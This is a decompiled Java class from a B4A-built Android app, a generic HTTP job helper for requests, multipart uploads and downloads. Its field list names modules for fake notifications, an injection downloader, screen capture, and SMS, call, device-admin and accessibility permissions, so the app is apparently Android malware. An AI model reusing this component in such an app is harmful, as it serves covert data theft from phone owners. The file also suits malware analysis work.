package com.com.androidrr;

import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.StringBuilderWrapper;
import anywheresoftware.b4a.objects.StringUtils;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.drawable.CanvasWrapper;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4h.okhttp.OkHttpClientWrapper;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import java.util.HashMap;
import org.eclipse.paho.client.mqttv3.internal.wire.MqttWireMessage;

/* loaded from: classes.dex */
public class httpjob extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public String _jobname = "";
    public boolean _success = false;
    public String _username = "";
    public String _password = "";
    public String _errormessage = "";
    public Object _target = null;
    public String _taskid = "";
    public OkHttpClientWrapper.OkHttpRequest _req = null;
    public OkHttpClientWrapper.OkHttpResponse _response = null;
    public Object _tag = null;
    public String _invalidurl = "";
    public String _defaultscheme = "";
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.httpjob");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", httpjob.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public static class _multipartfiledata {
        public String ContentType;
        public String Dir;
        public String FileName;
        public boolean IsInitialized;
        public String KeyName;

        public void Initialize() {
            this.IsInitialized = true;
            this.Dir = "";
            this.FileName = "";
            this.KeyName = "";
            this.ContentType = "";
        }

        public String toString() {
            return BA.TypeToString(this, false);
        }
    }

    public String _addscheme(String str) throws Exception {
        if (this._defaultscheme.equals("") || str.contains(":")) {
            return str;
        }
        return this._defaultscheme + "://" + str;
    }

    public String _class_globals() throws Exception {
        this._jobname = "";
        this._success = false;
        this._username = "";
        this._password = "";
        this._errormessage = "";
        this._target = new Object();
        this._taskid = "";
        this._req = new OkHttpClientWrapper.OkHttpRequest();
        this._response = new OkHttpClientWrapper.OkHttpResponse();
        this._tag = new Object();
        this._invalidurl = "https://invalid-url/";
        this._defaultscheme = "https";
        return "";
    }

    public String _complete(int i) throws Exception {
        this._taskid = BA.NumberToString(i);
        Common.CallSubDelayed2(this.f268ba, this._target, "JobDone", this);
        return "";
    }

    public String _delete(String str) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializeDelete(str);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("932571397", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializeDelete(this._invalidurl);
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _delete2(String str, String[] strArr) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializeDelete(_escapelink(str, strArr));
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("932636933", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializeDelete(_escapelink(this._invalidurl, strArr));
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _download(String str) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializeGet(str);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("932374789", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializeGet(this._invalidurl);
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _download2(String str, String[] strArr) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializeGet(_escapelink(str, strArr));
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("932440325", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializeGet(_escapelink(this._invalidurl, strArr));
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _escapelink(String str, String[] strArr) throws Exception {
        StringBuilderWrapper stringBuilderWrapper = new StringBuilderWrapper();
        stringBuilderWrapper.Initialize();
        stringBuilderWrapper.Append(str);
        if (strArr.length > 0) {
            stringBuilderWrapper.Append("?");
        }
        StringUtils stringUtils = new StringUtils();
        int length = strArr.length - 1;
        for (int i = 0; i <= length; i += 2) {
            if (i > 0) {
                stringBuilderWrapper.Append("&");
            }
            stringBuilderWrapper.Append(stringUtils.EncodeUrl(strArr[i], "UTF8")).Append("=");
            stringBuilderWrapper.Append(stringUtils.EncodeUrl(strArr[i + 1], "UTF8"));
        }
        return stringBuilderWrapper.ToString();
    }

    public CanvasWrapper.BitmapWrapper _getbitmap() throws Exception {
        new CanvasWrapper.BitmapWrapper();
        return Common.LoadBitmap(httputils2service._tempfolder, this._taskid);
    }

    public CanvasWrapper.BitmapWrapper _getbitmapresize(int i, int i2, boolean z) throws Exception {
        return Common.LoadBitmapResize(httputils2service._tempfolder, this._taskid, i, i2, z);
    }

    public CanvasWrapper.BitmapWrapper _getbitmapsample(int i, int i2) throws Exception {
        return Common.LoadBitmapSample(httputils2service._tempfolder, this._taskid, i, i2);
    }

    public File.InputStreamWrapper _getinputstream() throws Exception {
        new File.InputStreamWrapper();
        File file = Common.File;
        return File.OpenInput(httputils2service._tempfolder, this._taskid);
    }

    public OkHttpClientWrapper.OkHttpRequest _getrequest() throws Exception {
        return this._req;
    }

    public String _getstring() throws Exception {
        return _getstring2("UTF8");
    }

    public String _getstring2(String str) throws Exception {
        File.TextReaderWrapper textReaderWrapper = new File.TextReaderWrapper();
        File file = Common.File;
        textReaderWrapper.Initialize2(File.OpenInput(httputils2service._tempfolder, this._taskid).getObject(), str);
        String ReadAll = textReaderWrapper.ReadAll();
        textReaderWrapper.Close();
        return ReadAll;
    }

    public String _head(String str) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializeHead(str);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("932112645", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializeHead(this._invalidurl);
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _initialize(BA BA, String str, Object obj) throws Exception {
        innerInitialize(BA);
        this._jobname = str;
        this._target = obj;
        if (httputils2service._tempfolder.equals("")) {
            JavaObject javaObject = new JavaObject();
            StringBuilder sb = new StringBuilder();
            B4AApplication b4AApplication = Common.Application;
            sb.append(B4AApplication.getPackageName());
            sb.append(".httputils2service");
            javaObject.InitializeNewInstance(sb.toString(), (Object[]) Common.Null);
            javaObject.RunMethod("onReceive", new Object[]{Common.Null, Common.Null});
        }
        return "";
    }

    public boolean _multipartstartsection(File.OutputStreamWrapper outputStreamWrapper, boolean z) throws Exception {
        if (z) {
            return false;
        }
        outputStreamWrapper.WriteBytes(new byte[]{MqttWireMessage.MESSAGE_TYPE_PINGRESP, 10}, 0, 2);
        return z;
    }

    public String _patchbytes(String str, byte[] bArr) throws Exception {
        String _addscheme = _addscheme(str);
        try {
            this._req.InitializePatch2(_addscheme, bArr);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("932047116", "Invalid link: " + Common.SmartStringFormatter("", _addscheme) + "", 0);
            this._req.InitializePatch2(this._invalidurl, bArr);
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _patchstring(String str, String str2) throws Exception {
        _patchbytes(str, str2.getBytes("UTF8"));
        return "";
    }

    public String _postbytes(String str, byte[] bArr) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializePost2(str, bArr);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("931784965", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializePost2(this._invalidurl, bArr);
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _postfile(String str, String str2, String str3) throws Exception {
        String _addscheme = _addscheme(str);
        File file = Common.File;
        if (str2.equals(File.getDirAssets())) {
            Common.LogImpl("932309256", "Cannot send files from the assets folder.", 0);
            return "";
        }
        File file2 = Common.File;
        int Size = (int) File.Size(str2, str3);
        new File.InputStreamWrapper();
        File file3 = Common.File;
        File.InputStreamWrapper OpenInput = File.OpenInput(str2, str3);
        if (Size < 1000000) {
            File.OutputStreamWrapper outputStreamWrapper = new File.OutputStreamWrapper();
            outputStreamWrapper.InitializeToBytesArray(Size);
            File file4 = Common.File;
            File.Copy2(OpenInput.getObject(), outputStreamWrapper.getObject());
            _postbytes(_addscheme, outputStreamWrapper.ToBytesArray());
        } else {
            this._req.InitializePost(_addscheme, OpenInput.getObject(), Size);
            Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        }
        return "";
    }

    public String _postmultipart(String str, Map map, List list) throws Exception {
        Map map2 = map;
        File.OutputStreamWrapper outputStreamWrapper = new File.OutputStreamWrapper();
        outputStreamWrapper.InitializeToBytesArray(0);
        String str2 = BA.ObjectToString(Character.valueOf(Common.Chr(13))) + BA.ObjectToString(Character.valueOf(Common.Chr(10)));
        boolean z = true;
        if (map2 != null && map.IsInitialized()) {
            BA.IterableList Keys = map.Keys();
            int size = Keys.getSize();
            int i = 0;
            while (i < size) {
                String ObjectToString = BA.ObjectToString(Keys.Get(i));
                String ObjectToString2 = BA.ObjectToString(map2.Get(ObjectToString));
                boolean _multipartstartsection = _multipartstartsection(outputStreamWrapper, z);
                byte[] bytes = ("--" + Common.SmartStringFormatter("", "---------------------------1461124740692") + "\nContent-Disposition: form-data; name=\"" + Common.SmartStringFormatter("", ObjectToString) + "\"\n\n" + Common.SmartStringFormatter("", ObjectToString2) + "").replace(Common.CRLF, str2).getBytes("UTF8");
                outputStreamWrapper.WriteBytes(bytes, 0, bytes.length);
                i++;
                map2 = map;
                z = _multipartstartsection;
                Keys = Keys;
            }
        }
        if (list != null && list.IsInitialized()) {
            int size2 = list.getSize();
            boolean z2 = z;
            int i2 = 0;
            while (i2 < size2) {
                _multipartfiledata _multipartfiledataVar = (_multipartfiledata) list.Get(i2);
                z2 = _multipartstartsection(outputStreamWrapper, z2);
                byte[] bytes2 = ("--" + Common.SmartStringFormatter("", "---------------------------1461124740692") + "\nContent-Disposition: form-data; name=\"" + Common.SmartStringFormatter("", _multipartfiledataVar.KeyName) + "\"; filename=\"" + Common.SmartStringFormatter("", _multipartfiledataVar.FileName) + "\"\nContent-Type: " + Common.SmartStringFormatter("", _multipartfiledataVar.ContentType) + "\n\n").replace(Common.CRLF, str2).getBytes("UTF8");
                int i3 = size2;
                outputStreamWrapper.WriteBytes(bytes2, 0, bytes2.length);
                new File.InputStreamWrapper();
                File file = Common.File;
                File.InputStreamWrapper OpenInput = File.OpenInput(_multipartfiledataVar.Dir, _multipartfiledataVar.FileName);
                File file2 = Common.File;
                File.Copy2(OpenInput.getObject(), outputStreamWrapper.getObject());
                i2++;
                size2 = i3;
            }
            z = z2;
        }
        _multipartstartsection(outputStreamWrapper, z);
        byte[] bytes3 = ("--" + Common.SmartStringFormatter("", "---------------------------1461124740692") + "--\n").replace(Common.CRLF, str2).getBytes("UTF8");
        outputStreamWrapper.WriteBytes(bytes3, 0, bytes3.length);
        _postbytes(str, outputStreamWrapper.ToBytesArray());
        this._req.SetContentType("multipart/form-data; boundary=---------------------------1461124740692");
        this._req.SetContentEncoding("UTF8");
        return "";
    }

    public String _poststring(String str, String str2) throws Exception {
        _postbytes(str, str2.getBytes("UTF8"));
        return "";
    }

    public String _putbytes(String str, byte[] bArr) throws Exception {
        try {
            str = _addscheme(str);
            this._req.InitializePut2(str, bArr);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("931916037", "Invalid link: " + Common.SmartStringFormatter("", str) + "", 0);
            this._req.InitializePut2(this._invalidurl, bArr);
        }
        Common.CallSubDelayed2(this.f268ba, httputils2service.getObject(), "SubmitJob", this);
        return "";
    }

    public String _putstring(String str, String str2) throws Exception {
        _putbytes(str, str2.getBytes("UTF8"));
        return "";
    }

    public String _release() throws Exception {
        File file = Common.File;
        File.Delete(httputils2service._tempfolder, this._taskid);
        return "";
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
